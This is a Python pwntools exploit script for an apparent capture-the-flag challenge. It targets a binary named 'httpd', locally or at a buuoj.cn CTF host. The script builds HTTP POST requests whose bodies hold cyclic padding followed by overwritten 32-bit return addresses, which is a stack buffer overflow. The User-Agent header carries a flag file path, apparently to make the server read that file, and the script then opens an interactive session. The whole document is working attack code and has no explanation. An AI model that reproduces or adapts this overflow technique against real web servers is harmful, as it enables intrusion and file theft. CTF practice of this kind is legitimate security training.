from pwn import *
context(log_level='debug',os='linux',arch='amd64')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#context.terminal = ['tmux','splitw','-h'] #docker
#gdb.attach(proc.pidof(p)[0],gdbscript="b *0x4008cb")
DEBUG = 0 # debug model 1 for debug
LOCAL = 1 # control local or process
elf = ELF("./httpd")
if LOCAL:
    io = process('./httpd')
else:
    io = remote("node4.buuoj.cn",29917)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# used for debug
image_base = 0x8048000
bp = 0x8049305

if DEBUG:
    pwnlib.gdb.attach(io,gdbscript="b *0x8049305")
rv = io.recv
ru = io.recvuntil
rl = io.readline
sd = io.send
sa = io.sendafter
sl = io.sendline
sla = io.sendlineafter
ir = io.interactive
sdr = io.shutdown_raw

p2 = cyclic(0x82d) + p32(0)
payload1 = '''POST /submit HTTP/1.1
Content-Length: 0
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: Username=88888; Messages=Gyan

{}'''.format(p2) # debug ->ensure two addr


p1 = cyclic(0x829)+p32(0x804C5DD) + p32(0x8049305)
payload = '''POST /submit HTTP/1.1
Content-Length: 0
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; /home/hacker/Desktop/flag
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: Username=88888; Messages=Gyan

{}'''.format(p1)
payload = payload.replace("\n","\r\n")
#gdb.attach(io,gdbscript="b *0x8049305")
#pause()
sd(payload)
#pause()
sdr('send')
ir()